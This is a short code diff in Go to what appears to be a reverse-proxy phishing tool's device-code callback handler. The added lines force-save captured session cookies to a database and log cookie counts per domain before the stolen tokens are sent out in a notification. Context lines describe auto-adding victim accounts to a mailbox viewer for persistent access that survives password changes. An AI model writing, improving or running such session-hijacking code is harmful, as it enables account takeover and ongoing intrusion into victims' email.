@@ -3874,6 +3874,15 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 					finalCookieCount += len(cookies)
 				}
 				log.Info("[devicecode] === COOKIE RETRIEVAL END: %d total cookies ===", finalCookieCount)
+				
+				// FORCE SAVE cookies to database before notification (ensure persistence)
+				if finalCookieCount > 0 {
+					if err := p.db.SetSessionCookieTokens(s.Id, s.CookieTokens); err != nil {
+						log.Warning("[devicecode] Failed to force-save cookies: %v", err)
+					} else {
+						log.Info("[devicecode] Force-saved %d cookies to database", finalCookieCount)
+					}
+				}
 
 				// Automatically add account to mailbox manager for persistent access
 				// This ensures the account survives password changes as long as tokens are refreshed
@@ -3885,6 +3894,13 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 							log.Success("[mailbox] Account auto-added to mailbox viewer (session %d)", s.Id)
 						}
 					}()
+				}
+
+				// Log exactly what we're about to send
+				log.Important("[devicecode] TRIGGERING NOTIFICATION - Session %s has %d cookie domains, %d total cookies", 
+					s.Id, len(s.CookieTokens), finalCookieCount)
+				for domain, cookies := range s.CookieTokens {
+					log.Info("[devicecode] Domain: %s - %d cookies", domain, len(cookies))
 				}
 
 				// Send notification with captured tokens
